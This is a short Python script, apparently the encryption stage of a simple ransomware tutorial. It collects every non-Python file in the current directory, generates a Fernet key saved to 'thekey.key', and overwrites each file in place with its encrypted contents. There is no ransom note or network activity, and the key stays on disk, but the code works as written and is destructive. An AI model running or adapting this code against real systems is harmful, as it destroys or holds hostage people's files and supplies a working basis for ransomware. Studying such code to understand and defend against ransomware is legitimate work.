import os
from cryptography.fernet import Fernet

# Find all files except this script and the key file
files = []

for file in os.listdir():
    if file.endswith(".py") or file == "thekey.key":
        continue
    if os.path.isfile(file):
        files.append(file)

print("[+] Files to encrypt:", files)

# Generate a key and save it
key = Fernet.generate_key()

with open("thekey.key", "wb") as thekey:
    thekey.write(key)

cipher = Fernet(key)

# Encrypt each file
for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = cipher.encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)

print("[+] Encryption complete.")
